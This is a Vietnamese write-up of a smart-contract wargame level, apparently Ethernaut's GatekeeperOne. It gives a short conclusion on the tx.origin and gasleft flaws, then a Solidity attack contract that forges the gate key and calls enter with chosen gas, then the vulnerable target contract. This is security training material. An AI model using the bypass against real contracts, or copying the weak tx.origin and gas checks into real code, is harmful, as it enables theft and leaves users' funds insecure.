### Kết luận
- Lỗ hổng: Sử dụng `tx.origi` và logic lượng gas.
- Cách phòng tránh: Tránh sử dụng `tx.origin` và logic dựa vào gasleft để tăng tính bảo mật, sử dụng cơ chế xác thực mạnh hơn như chữ ký (signature) hoặc giá trị hash.
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol'; // Path change of openzeppelin contract

pragma solidity ^0.8.0;
interface IGatekeeperOne{
    function enter(bytes8 _gateKey) external returns (bool);
}
contract gatekeeperoneAttack{
    using SafeMath for uint256;
    IGatekeeperOne public victim;
    constructor (address challenge){
        victim = IGatekeeperOne(challenge);
    }
     modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
    function attack( uint256 gasUse) external {
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))) | (1 << 32)); // Ép kiểu sang bytes8  
        victim.enter{gas: gasUse}(gateKey);
    }
     
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
